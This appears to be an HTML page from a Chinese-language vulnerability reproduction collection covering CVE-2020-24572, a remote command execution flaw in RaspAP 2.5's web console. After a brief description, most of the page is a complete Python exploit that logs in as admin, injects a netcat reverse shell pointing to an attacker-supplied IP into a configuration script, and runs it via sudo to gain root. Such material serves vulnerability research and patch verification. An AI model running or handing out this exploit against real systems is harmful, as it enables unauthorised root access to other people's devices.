<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
			.csD1E291E2{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs6FD73CFB{text-align:left;text-indent:0pt;margin:5pt 24pt 5pt 24pt}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="cve-2020-24572raspap-25-远程命令执行漏洞"><span class="csECDA2D3">（</span><span class="csDE05BCC">CVE-2020-24572</span><span class="csECDA2D3">）</span><span class="csDE05BCC">RaspAP 2.5 </span><span class="csECDA2D3">远程命令执行漏洞</span></a></h1>
		<h2 class="cs868C439D">
			<a name="一漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">在</span><span class="cs8926E06">RaspAP 2.5</span><span class="cs9C1B1871">的</span><span class="cs9FB05234">include/webconsole.php</span><span class="cs9C1B1871">中发现了一个问题。借助经过身份验证的访问，攻击者可以使用配置错误（并且实际上不受限制）的</span><span class="cs8926E06">Web</span><span class="cs9C1B1871">控制台攻击运行该软件的底层</span><span class="cs8926E06">OS</span><span class="cs9C1B1871">（</span><span class="cs8926E06">Raspberry Pi</span><span class="cs9C1B1871">），并在系统上执行命令（包括用于上传文件和执行代码的命令）。</span></p><h2 class="cs868C439D">
			<a name="二漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">RaspAP 2.5</span></p><h2 class="cs868C439D">
			<a name="三复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
		<h3 class="cs868C439D">
			<a name="poc"><span class="csD1E291E2">poc</span></a></h3>
		<p class="cs6FD73CFB"><span class="cs8926E06">CVE-2020-24572.py</span></p><p class="cs40DD2BC9"><span><img src="Web安全/RaspAP/%ef%bc%88CVE-2020-24572%ef%bc%89RaspAP%202.5%20%e8%bf%9c%e7%a8%8b%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_files/image0.png" width="560" height="128" alt="" style="border-width:0px;" /></span><span class="cs8926E06"><br/><img src="Web安全/RaspAP/%ef%bc%88CVE-2020-24572%ef%bc%89RaspAP%202.5%20%e8%bf%9c%e7%a8%8b%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_files/image1.png" width="560" height="143" alt="" style="border-width:0px;" /></span></p><p class="cs3A447A38"><span class="cs9FB05234">#/usr/bin/python3</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">#####################################################</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">############## &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;deadb0x.io &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;##############</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">#####################################################</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Proof of Concept for CVE-2020-24572 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;###</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">### &nbsp;&nbsp;&nbsp;&nbsp;(Authenticated) Remote Code Execution &nbsp;&nbsp;&nbsp;&nbsp;###</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;via Webconsole.php in &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;###</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;RaspAP v2.5 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;###</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;github.com/billz/raspap-webgui &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;###</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;github.com/nickola/web-console &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;###</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">#####################################################</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">### Written by: lunchb0x - Disc. Date: 08/24/2020 ###</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">#####################################################</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;deadb0x.io/lunchb0x/CVE-2020-24572 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;###</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;github.com/lb0x/CVE-2020-24572 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;###</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">#####################################################</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">import os</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import sys</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import requests</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">from termcolor import colored</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">if len(sys.argv) != 6:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print(&quot;---------------------------------------------------------------------------------------&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print(&quot;USAGE: rasp_pwn.py [target_ip] [port] [attacker_ip] [attacker_port] [RaspAP_admin_pass]&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print(&quot;---------------------------------------------------------------------------------------&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;exit(1)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">target = sys.argv[1]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">port = sys.argv[2]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">listener_ip = sys.argv[3]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">listener_port = sys.argv[4]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">raspap_user = &quot;admin&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">raspap_pass = sys.argv[5]</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">session = requests.Session()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">session.auth = (raspap_user, raspap_pass)</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234">json_req_1 = {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;jsonrpc&quot;:&quot;2.0&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;method&quot;:&quot;run&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;params&quot;:[&quot;NO_LOGIN&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{&quot;user&quot;:&quot;&quot;,&quot;hostname&quot;:&quot;&quot;,&quot;path&quot;:&quot;&quot;},</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;echo &#39;touch \/tmp\/f;rm \/tmp\/f;mkfifo \/tmp\/f;cat \/tmp\/f|\/bin\/bash -i 2&gt;&amp;1|nc %s %d &gt;\/tmp\/f&#39; &gt;&gt; \/etc\/raspap\/lighttpd\/configport.sh&quot;%(listener_ip, listener_port)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;],</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;id&quot;:6</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">json_req_2 = {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;jsonrpc&quot;:&quot;2.0&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;method&quot;:&quot;run&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;params&quot;:[&quot;NO_LOGIN&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{&quot;user&quot;:&quot;&quot;,&quot;hostname&quot;:&quot;&quot;,&quot;path&quot;:&quot;&quot;},</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;sudo /etc/raspap/lighttpd/configport.sh&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;],</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;id&quot;:6</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">r = session.post(&quot;http://%s:%s/includes/webconsole.php&quot;%(target,port), json=json_req_1)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">print(colored(&quot;[!]&quot;, &#39;green&#39;) + &quot; Reverse shell injected&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">print(colored(&quot;[!]&quot;, &#39;yellow&#39;) + &quot; Sending activation request - Make sure your listener is running . . .&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">os.system(&quot;stty -echo&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">input(colored(&quot;[&gt;&gt;&gt;]&quot;, &#39;green&#39;)+&quot; Press ENTER to continue . . .&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">os.system(&quot;stty echo&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">print(colored(&quot;\n[!]&quot;, &#39;green&#39;) + &quot; You should be root :)&quot;)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">r = session.post(&quot;http://%s:%s/includes/webconsole.php&quot;%(target,port), json=json_req_2)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">print(colored(&quot;[*]&quot;, &#39;green&#39;) + &quot; Done.&quot;)</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234">print(colored(&quot;----------------&quot;, &#39;yellow&#39;))</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">print(colored(&quot;[] deadb0x.io&quot;, &#39;yellow&#39;))</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">print(colored(&quot;----------------&quot;, &#39;yellow&#39;))</span></p><h2 class="cs868C439D">
			<a name="参考链接"><span class="cs83F14626">参考链接</span></a></h2>
		<p class="cs6FD73CFB"><span class="cs8926E06">https://deadb0x.io/lunchb0x/cve-2020-24572/</span></p></body>
</html>
